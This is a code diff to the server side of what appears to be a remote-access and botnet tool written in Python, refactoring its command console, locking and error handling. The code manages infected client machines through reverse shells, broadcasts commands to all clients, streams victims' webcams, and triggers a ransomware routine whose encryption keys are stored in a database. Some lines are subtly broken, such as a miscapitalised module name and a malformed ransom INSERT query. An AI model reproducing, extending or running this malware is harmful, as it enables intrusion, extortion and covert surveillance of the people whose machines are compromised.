@@ -119,26 +119,21 @@ class ServerThread(threading.Thread):
         self.shell          = threading.Event()
         self.lock           = threading.Lock()
         self.commands       = {
-	    'background'    :   self.background_client,
             'back'          :   self.background_client,
-            'bg'            :   self.background_client,
             'client'        :   self.select_client,
             'clients'       :   self.list_clients,
             'exit'          :   self.quit_server,
+            'help'          :   self.show_usage_help,
             'kill'          :   self.remove_client,
             'quit'          :   self.quit_server,
             'query'         :   self.query_database,
             'ransom'        :   self.ransom_client,
             'restore'       :   self.restore_client,
             'results'       :   self.show_task_results,
-            'select'        :   self.select_client,
 	    'sendall'	    :   self.sendall_clients,
-            'settings'      :   self.settings,
+            'settings'      :   self.display_settings,
             'session'       :   self.get_current_session,
             'webcam'        :   self.webcam_client,
-            '--help'        :   self.usage,
-            '-h'            :   self.usage,
-            '?'             :   self.usage
             }
         self.db             = globals().get('___DB___')
         self._rand_color    = lambda: getattr(colorama.Fore, random.choice(['RED','CYAN','GREEN','YELLOW','WHITE','MAGENTA']))
@@ -386,9 +381,8 @@ class ServerThread(threading.Thread):
                 self.current_client.shell.clear()
             client = self.clients[int(client_id)]
             self.current_client = client
-            with self.lock and self.current_client.lock:
-                print(colorama.Fore.CYAN + colorama.Style.BRIGHT + "\n\n\t[+] " + colorama.Fore.RESET + colorama.Style.DIM + "Client {} selected".format(client.name, client.address[0]) + self._text_color + self._text_style)
-                print(self._text_color + self._text_style)
+            print(colorama.Fore.CYAN + colorama.Style.BRIGHT + "\n\n\t[+] " + colorama.Fore.RESET + colorama.Style.DIM + "Client {} selected".format(client.name, client.address[0]) + self._text_color + self._text_style)
+            print(self._text_color + self._text_style)
             self.current_client.shell.set()
             return self.current_client.run()
 
@@ -450,10 +444,12 @@ class ServerThread(threading.Thread):
 
 
     def list_clients(self):
-        print(self._text_color + colorama.Style.BRIGHT + '\n{:>3}'.format('#') + colorama.Fore.YELLOW + colorama.Style.DIM + ' | ' + colorama.Style.BRIGHT + self._text_color + '{:>64}'.format('Session ID') + colorama.Style.DIM + colorama.Fore.YELLOW + ' | ' + colorama.Style.BRIGHT + self._text_color + '{:>16}'.format('IP Address') + colorama.Style.DIM + colorama.Fore.YELLOW  + '\n-----------------------------------------------------------------------------------------')
-        for k, v in self.clients.items():
-            print(self._text_color + colorama.Style.BRIGHT + '{:>3}'.format(k) + colorama.Fore.YELLOW  + colorama.Style.DIM + ' | ' + colorama.Style.BRIGHT + self._text_color + '{:>33}'.format(v.session) + colorama.Fore.YELLOW  + colorama.Style.DIM + ' | ' + colorama.Style.BRIGHT + self._text_color + '{:>16}'.format(v.address[0]))
-        print('\n')
+        lock = self.lock if not self.current_client else self.current_client.lock
+        with lock:
+            print(self._text_color + colorama.Style.BRIGHT + '\n{:>3}'.format('#') + colorama.Fore.YELLOW + colorama.Style.DIM + ' | ' + colorama.Style.BRIGHT + self._text_color + '{:>64}'.format('Session ID') + colorama.Style.DIM + colorama.Fore.YELLOW + ' | ' + colorama.Style.BRIGHT + self._text_color + '{:>16}'.format('IP Address') + colorama.Style.DIM + colorama.Fore.YELLOW  + '\n-----------------------------------------------------------------------------------------')
+            for k, v in self.clients.items():
+                print(self._text_color + colorama.Style.BRIGHT + '{:>3}'.format(k) + colorama.Fore.YELLOW  + colorama.Style.DIM + ' | ' + colorama.Style.BRIGHT + self._text_color + '{:>33}'.format(v.session) + colorama.Fore.YELLOW  + colorama.Style.DIM + ' | ' + colorama.Style.BRIGHT + self._text_color + '{:>16}'.format(v.address[0]))
+            print('\n')
         self._return()
           
     def quit_server(self):
@@ -462,14 +458,15 @@ class ServerThread(threading.Thread):
                 self.send_client('standby', client.name)
             except Exception as e:
                 print(str(e))
-        exit()
+        sys.exit()
 
-    def settings(self, args=None):
-        self.current_client.lock.acquire() if self.current_client else self.lock.acquire()
+    def display_settings(self, args=None):
+        lock = self.lock if not self.current_client else self.current_client.lock
+        lock.acquire()
         if not args:
-            print(colorama.Fore.RESET + colorama.Style.BRIGHT + '\n\t\tSettings')
+            print(colorama.Fore.RESET + colorama.Style.BRIGHT + '\n\n\t\tSettings')
             print(self._text_color + self._text_style + '\tdefault text color + style')
-            print(self._prompt_color + self._prompt_style + '\tdefault prompt color + style\n')
+            print(self._prompt_color + self._prompt_style + '\tdefault prompt color + style')
             print(self._text_color + self._text_style)
         else:
             target, _, options = args.partition(' ')
@@ -481,12 +478,12 @@ class ServerThread(threading.Thread):
                     if not hasattr(colorama.Fore, option):
                         print("usage: settings prompt color [value]\ncolors:   white/black/red/yellow/green/cyan/magenta")
                     self._prompt_color = getattr(colorama.Fore, option)
-                    print("prompt color changed to '{}'".format(option))
+                    print(colorama.Fore.RESET + Colorama.Style.BRIGHT + "prompt color changed to " + self._prompt_color + self._prompt_style + option)
                 elif setting == 'style':
                     if not hasattr(colorama.Style, option):
                         self._print("usage: settings prompt style [value]\nstyles:   bright/normal/dim")
                     self._prompt_style = getattr(colorama.Style, option)
-                    print("prompt style changed to '{}'".format(option))
+                    print(colorama.Fore.RESET + Colorama.Style.BRIGHT + "prompt style changed to " + self._prompt_color + self._prompt_style + option)
                 else:
                     print("usage: settings prompt <option> [value]")
             elif target == 'text':
@@ -494,43 +491,39 @@ class ServerThread(threading.Thread):
                     if not hasattr(colorama.Fore, option):
                         self._print("usage: settings text color [value]\ncolors:     white/black/red/yellow/green/cyan/magenta")
                     self._text_color = getattr(colorama.Fore, option)
-                    print("text color changed to '{}'".format(option))
+                    print(colorama.Fore.RESET + Colorama.Style.BRIGHT + "text color changed to " + self._text_color + self._text_style + option)                    
                 elif setting == 'style':
                     if not hasattr(colorama.Style, option):
                         self._print("usage: settings text style [value]\nstyles:     bright/normal/dim")
                     self._text_style = getattr(colorama.Style, option)
-                    print("text style changed to '{}'".format(option))
+                    print(colorama.Fore.RESET + Colorama.Style.BRIGHT + "text style changed to " + self._text_color + self._text_style + option)
                 else:
                     print("usage: settings text <option> [value]")
-        self.current_client.lock.release() if self.current_client else self.lock.release()
+        lock.release()
         self._return()
 
-    def usage(self):
-        self.current_client.lock.acquire() if self.current_client else self.lock.acquire()
-        print('\n')
-        print(colorama.Fore.YELLOW  + colorama.Style.DIM    + '--------------------------------------------------------------------')
-        print(self._text_color + colorama.Style.BRIGHT + '    command <argument>      ' + colorama.Fore.YELLOW + colorama.Style.DIM + '|' + colorama.Style.BRIGHT + self._text_color + ' descripton')
-        print(colorama.Fore.YELLOW  + colorama.Style.DIM    + '--------------------------------------------------------------------')
-        print(self._text_color + self._text_style + '    bg / back / background  ' + colorama.Fore.YELLOW + '|' + self._text_color + ' Push current client to background')
-        print(self._text_color + self._text_style + '    clients                 ' + colorama.Fore.YELLOW + '|' + self._text_color + ' List connected clients')
-        print(self._text_color + self._text_style + '    client <id>             ' + colorama.Fore.YELLOW + '|' + self._text_color + ' Connect to a client')
-        print(self._text_color + self._text_style + '    kill <id>               ' + colorama.Fore.YELLOW + '|' + self._text_color + ' Remove client from connection pool')
-        print(self._text_color + self._text_style + '    exit / quit             ' + colorama.Fore.YELLOW + '|' + self._text_color + ' Exit server and keep clients alive')
-        print(self._text_color + self._text_style + '    query                   ' + colorama.Fore.YELLOW + '|' + self._text_color + ' Query database and return output')
-        print(self._text_color + self._text_style + '    results <id>            ' + colorama.Fore.YELLOW + '|' + self._text_color + ' List task results from database')
-        print(self._text_color + self._text_style + '    sendall <command>       ' + colorama.Fore.YELLOW + '|' + self._text_color + ' Send command to all clients')
-        print(self._text_color + self._text_style + '    settings <options>      ' + colorama.Fore.YELLOW + '|' + self._text_color + ' Edit color/style settings')
-        print(colorama.Fore.YELLOW  + colorama.Style.DIM    + '--------------------------------------------------------------------')
-        print(self._text_color + self._text_style + '< > = required argument')
-        print(self._text_color + self._text_style+ '[ ] = optional argument\n')
-        print('\n')
-        self.current_client.lock.release() if self.current_client else self.lock.release()
-
+    def show_usage_help(self, data=None):
+        info = {"back": "background the current client", "client <id>": "interact with client via reverse shell", "clients": "list current clients", "exit": "exit the program but keep clients alive", "sendall <command>": "send a command to all connected clients", "settings <value> [options]": "list/change current display settings"}
+        lock = self.lock if not self.current_client else self.current_client.lock
+        info.update(json.loads(data)) if data else None
+        max_k, max_v     = int(max([len(k) for k in info.keys()]) + 2), int(max([len(v) for v in info.values()]) + 2)
+        min_k, min_v     = int(int(max_k - len('command <argument>'))/2), int(int(max_v - len('description'))/2)
+        max_key, max_val = " {:<%d}" % max_k, " {:<%d}" % max_v
+        with lock:
+            print('\n')
+            print(colorama.Fore.YELLOW  + colorama.Style.DIM + '\t.' + '-' * int(max_k + max_v + 3) + colorama.Fore.YELLOW + colorama.Style.DIM + '.')
+            print(colorama.Fore.YELLOW  + colorama.Style.DIM + '\t|' + self._text_color + colorama.Style.BRIGHT + ' ' * int(min_k + 1) + 'command <argument>' + ' ' * min_k + colorama.Fore.YELLOW + colorama.Style.DIM + '|' + colorama.Style.BRIGHT + self._text_color + ' ' * int(min_v + 1) + 'description' + ' ' * min_v + colorama.Fore.YELLOW + colorama.Style.DIM + '|')
+            print(colorama.Fore.YELLOW  + colorama.Style.DIM + '\t|' + '-' * int(max_k + max_v + 3) + colorama.Fore.YELLOW + colorama.Style.DIM + '|')
+            for key in sorted(info):
+                print(colorama.Fore.YELLOW  + colorama.Style.DIM + '\t|' + self._text_color + self._text_style + max_key.format(key) + colorama.Fore.YELLOW + colorama.Style.DIM + '|' + self._text_color + max_val.format(str(info[key])) + colorama.Fore.YELLOW + colorama.Style.DIM + '|')
+            print(colorama.Fore.YELLOW  + colorama.Style.DIM + "\t'" + '-' * int(max_k + max_v + 3) + colorama.Fore.YELLOW + colorama.Style.DIM + "'")
 
     def webcam_client(self, args=''):
         try:
             if not self.current_client:
                 self._error( "No client selected")
+                return
+            
             client = self.current_client
             result = ''
             mode, _, arg = args.partition(' ')
@@ -572,12 +565,14 @@ class ServerThread(threading.Thread):
                 finally:
                     conn.close()
                     cv2.destroyAllWindows()
-                    client.shell.set()
+                    result = 'Webcam stream ended'
             else:
                 self.send_client("webcam %s" % args, client.name)
+                task    = self.recv_client(client.name)
+                result  = task.get('data')
+            return result
         except Exception as e:
             self._error("webcam stream failed with error: {}".format(str(e)))
-
 
     def ransom_client(self, path):
         if self.current_client:
@@ -588,7 +583,7 @@ class ServerThread(threading.Thread):
             sock.listen(1)
             self.send_client("ransom {} {}".format(path, port), client.name)
             c, a = sock.accept()
-            c.settimeout(5.0)
+            c.settimeout(10.0)
             while True:
                 buff = ''
                 while '\n' not in buff:
@@ -599,7 +594,7 @@ class ServerThread(threading.Thread):
                 if buff and len(str(buff)) and bytes('0' * 64) not in buff:
                     data = self._decrypt_aes(buff, self._deobfuscate(client.session_key))
                     task = json.loads(data)
-                    save = self.query_database("INSERT INTO ransom (session_id, file, key) VALUES ({})".format("'{}', ".format(i) for i in [task['session_id'], task['data']['file'], task['data']['key']]), display=False)
+                    save = self.query_database("INSERT INTO ransom (session_id, file, key) VALUES ({})".format("'{}', ".format(i) for i in [task['session_id'], task['data']['file'], base64.b64encode(task['data']['key'])]), display=False)
                 else:
                     break
         else:
@@ -639,7 +634,6 @@ class ServerThread(threading.Thread):
     def show_task_results(self, client_id=None):
         if str(client_id).isdigit() and int(client_id) in self.clients:
             client = self.clients[int(client_id)]
-            return self.query_database("SELECT * FROM tasks WHERE session_id='{}'".format(client.session).replace("Array\n(", "").replace("\n)", ""))
         elif self.current_client:
             client = self.current_client
         else:
@@ -658,9 +652,7 @@ class ServerThread(threading.Thread):
                     query   = self.query_database("INSERT INTO tasks (id, client_id, session_id, task, data) VALUES ({})".format(', '.join("'{}'".format(i) for i in (task['id'], task['client_id'], task['session_id'], task['task'], task['data']))), display=False)
                 except Exception as e:
                     self._error("{} returned error: {}".format(self.save_task_results.func_name, str(e)))
-        else:
-            self._error('Invalid task: {}'.format(bytes(task)))
-            self._return()
+        self._return()
 
     def get_current_session(self):
         try:
@@ -670,6 +662,7 @@ class ServerThread(threading.Thread):
                 return "No session key found"
         except Exception as e:
             self._error("{} returned error: {}".format(self.get_current_session.func_name, str(e)))
+            self._return()
 
     def query_database(self, query, display=True):
         if self.db.get('session_key'):
@@ -682,25 +675,19 @@ class ServerThread(threading.Thread):
                     if not display:
                         return output
                     else:
-                        if '\n' in output:
-                            try:
-                                i = 0
-                                output = output.split('\n')
-                                result = {}
-                                while i < len(output):
-                                    if len(output):
-                                        result.update({str(i + 1): json.loads(output)})
-                                    else:
-                                        break
-                                    i += 1
-                                self._print(json.dumps(result))
-                            except Exception as e:
-                                for item in output.split('\n'):
-                                    self._print(output)
+                        if '\n' in str(output):
+                            output = [_ for _ in str(output).split('\n') if _ if len(str(_)) if not str(_).isspace()]
+                            i = 1
+                            result = {}
+                            for row in output:
+                                result.update({i: json.loads(row)})
+                                i += 1
+                            self._print(json.dumps(result, sort_keys=True))
                         else:
                             self._print(output)
         else:
             self._error("No session key found")
+            self._return()
     
     def connection_handler(self):
         while True:
@@ -711,7 +698,6 @@ class ServerThread(threading.Thread):
             self.clients[self.count]  = client
             self.count  += 1
             client.start()
-            self._return()
             
     def run(self):
         while True:
@@ -734,15 +720,12 @@ class ServerThread(threading.Thread):
                         except: pass
                     if output and len(str(output)):
                         self._print(str(output))
-                if not self.connection_handler.func_name in threads or not threads[self.connection_handler.func_name].is_alive():
-                    threads[self.connection_handler.func_name] = threading.Thread(target=self.connection_handler, name=time.time())
-                    threads[self.connection_handler.func_name].start()
                 if self.exit_status:
                     break
             except KeyboardInterrupt:
                 break
         print('Server shutting down')
-        exit()
+        sys.exit()
 
     def start(self):
         threads[self.connection_handler.func_name] = threading.Thread(target=self.connection_handler, name=time.time())
@@ -759,23 +742,32 @@ class ClientHandler(threading.Thread):
     def __init__(self, connection, **kwargs):
         super(ClientHandler, self).__init__()
         self.prompt         = None
+        self.connection     = connection
         self.shell          = threading.Event()
         self.lock           = threading.Lock()
-        self.connection     = connection
         self.name           = kwargs.get('name')
         self.address        = kwargs.get('address')
         self.public_key     = kwargs.get('public_key')
         self.private_key    = kwargs.get('private_key')
-        self.session_key    = self.diffiehellman()
+        self.session_key    = self._diffiehellman()
         self.info           = self._info()
-        self.session        = self._session_id()
+        self.session        = self._session()
         self.connection.setblocking(True)
-        
+
+            
     def _prompt(self, data):
         return raw_input(threads['server']._prompt_color + threads['server']._prompt_style + '\n' + bytes(data).rstrip())
              
     def _error(self, data):
-        print('\n' + colorama.Fore.RED + colorama.Style.BRIGHT + '[-] ' + colorama.Fore.RESET + colorama.Style.DIM + 'Client {} Error: '.format(self.name) + bytes(data) + '\n')
+        with self.lock:
+            print('\n' + colorama.Fore.RED + colorama.Style.BRIGHT + '[-] ' + colorama.Fore.RESET + colorama.Style.DIM + 'Client {} Error: '.format(self.name) + bytes(data) + '\n')
+
+    def _kill(self):
+        self.shell.clear()
+        threads['server'].shell.set()
+        threads['server'].remove_client(self.name)
+        threads['server'].current_client = None
+        threads['server'].run()
 
     def _info(self):
         buf  = ''
@@ -799,24 +791,29 @@ class ClientHandler(threading.Thread):
             return data
         except Exception as e3:
             self._error("{} returned error: {}".format(self._info.func_name, str(e3)))
+            self._kill()
 
-    def _session_id(self):
-        query       = threads['server'].query_database("INSERT INTO sessions ({}) VALUES ({})".format(', '.join(['client_id','session_key','private_key','public_key']), ', '.join(["'{}'".format(v) for v in [self.info['id'], self.session_key, self.private_key.exportKey(), self.public_key.exportKey()]])), display=False)
-        session_id  = requests.post(threads['server'].db['domain'] + threads['server'].db['pages']['session'], data={'id': self.info['id']}).content
-        print(colorama.Fore.GREEN + colorama.Style.BRIGHT + "\n\n [+] " + colorama.Fore.RESET + "New connection" + colorama.Style.DIM + "\n{:>14}\t\t{}\n{:>15} {:>72}\n".format("Client ID", self.name, "Session ID", session_id) + threads['server']._text_color + threads['server']._text_style)
-        ciphertext  = getattr(threads['server'], '_encrypt_{}'.format(self.info.get('encryption')))(session_id, threads['server']._deobfuscate(self.session_key))
-        self.connection.sendall(ciphertext + '\n')
-        ciphertext  = ""
-        while "\n" not in ciphertext:
-            ciphertext += self.connection.recv(1024)
-        plaintext   = getattr(threads['server'], '_decrypt_{}'.format(self.info.get('encryption')))(ciphertext.rstrip(), threads['server']._deobfuscate(self.session_key))
-        request     = json.loads(plaintext)
-        if request.get('request') == 'public_key':
-            response = getattr(threads['server'], '_encrypt_{}'.format(self.info.get('encryption')))(self.public_key.exportKey(), threads['server']._deobfuscate(self.session_key))
-            self.connection.sendall(response + '\n')
-        return session_id
+    def _session(self):
+        try:
+            query       = threads['server'].query_database("INSERT INTO sessions ({}) VALUES ({})".format(', '.join(['client_id','session_key','private_key','public_key']), ', '.join(["'{}'".format(v) for v in [self.info['id'], self.session_key, self.private_key.exportKey(), self.public_key.exportKey()]])), display=False)
+            session_id  = requests.post(threads['server'].db['domain'] + threads['server'].db['pages']['session'], data={'id': self.info['id']}).content
+            print(colorama.Fore.GREEN + colorama.Style.BRIGHT + "\n\n\n [+] " + colorama.Fore.RESET + "New connection" + colorama.Style.DIM + "\n{:>14}\t\t{}\n{:>15} {:>72}\n".format("Client ID", self.name, "Session ID", session_id) + threads['server']._text_color + threads['server']._text_style)
+            ciphertext  = getattr(threads['server'], '_encrypt_{}'.format(self.info.get('encryption')))(session_id, threads['server']._deobfuscate(self.session_key))
+            self.connection.sendall(ciphertext + '\n')
+            ciphertext  = ""
+            while "\n" not in ciphertext:
+                ciphertext += self.connection.recv(1024)
+            plaintext   = getattr(threads['server'], '_decrypt_{}'.format(self.info.get('encryption')))(ciphertext.rstrip(), threads['server']._deobfuscate(self.session_key))
+            request     = json.loads(plaintext)
+            if request.get('request') == 'public_key':
+                response = getattr(threads['server'], '_encrypt_{}'.format(self.info.get('encryption')))(self.public_key.exportKey(), threads['server']._deobfuscate(self.session_key))
+                self.connection.sendall(response + '\n')
+            return session_id
+        except Exception as e:
+            self._error("{} returned error: {}".format(self._session.func_name, str(e)))
+            self._kill()
 
-    def diffiehellman(self):
+    def _diffiehellman(self):
         try:
             g  = 2
             p  = 0xFFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD129024E088A67CC74020BBEA63B139B22514A08798E3404DDEF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7EDEE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3DC2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF5F83655D23DCA3AD961C62F356208552BB9ED529077096966D670C354E4ABC9804F1746C08CA18217C32905E462E36CE3BE39E772C180E86039B2783A2EC07A28FB5C55DF06F4C52C9DE2BCBF6955817183995497CEA956AE515D2261898FA051015728E5A8AACAA68FFFFFFFFFFFFFFFF
@@ -828,30 +825,33 @@ class ClientHandler(threading.Thread):
             y  = SHA256.new(long_to_bytes(x)).hexdigest()
             return threads['server']._obfuscate(y)
         except Exception as e:
-            self._error("Diffie-Hellman transactionless key-agreement failed with error: {}\nRetrying...".format(str(e)))
-            time.sleep(1)
-            return self.diffiehellman()
+            self._error("{} returned error: {}".format(self._diffiehellman, str(e)))
+            self._kill()
 
     def run(self):
         while True:
             try:
                 if threads['server'].exit_status:
                     break
-                self.shell.wait()
                 task = self.prompt if self.prompt else threads['server'].recv_client(self.name)
+                self.shell.wait()
                 if type(task) is dict:
                     if 'prompt' in task.get('task'):
                         self.prompt     = task
                         command         = self._prompt(bytes(self.prompt.get('data')).format(self.name))
                         cmd, _, action  = bytes(command).partition(' ')
-                        if cmd in threads['server'].commands:
+                        if cmd in threads['server'].commands and cmd != 'help':
                             result = threads['server'].commands[cmd](action) if len(action) else threads['server'].commands[cmd]()
                             if result:
                                 threads['server']._print(result)
                                 threads['server'].save_task_results(task)
                             continue
                         else:
-                            threads['server'].send_client(command, self.name)                        
+                            threads['server'].send_client(command, self.name)
+                    elif 'help' in task.get('task'):
+                        self.shell.clear()
+                        threads['server'].show_usage_help(data=task.get('data'))
+                        self.shell.set()
                     else:
                         if task.get('data'):
                             threads['server']._print(task['data'])
@@ -860,18 +860,14 @@ class ClientHandler(threading.Thread):
             except Exception as e:
                 self._error(str(e))
                 break
-        self.shell.clear()
-        threads['server'].shell.set()
-        threads['server'].remove_client(self.name)
-        threads['server'].current_client = None
-        threads['server'].run()
+        self._kill()
 
 
 if __name__ == '__main__':
     port    = int(__PORT__)
     threads = {}
     threads['server'] = ServerThread(port)
-#    os.system('cls' if os.name is 'nt' else 'clear')
+    os.system('cls' if os.name is 'nt' else 'clear')
     print(threads['server']._rand_color() + BANNER + colorama.Fore.WHITE)
     print(colorama.Fore.YELLOW + "[?] " + colorama.Fore.RESET + "'-h' or '--help' in server prompt for server usage help\n\n" + colorama.Fore.YELLOW + "[?] " + colorama.Fore.RESET + "'show help' in client prompt for client usage help\n\n")
     threads['server'].start()
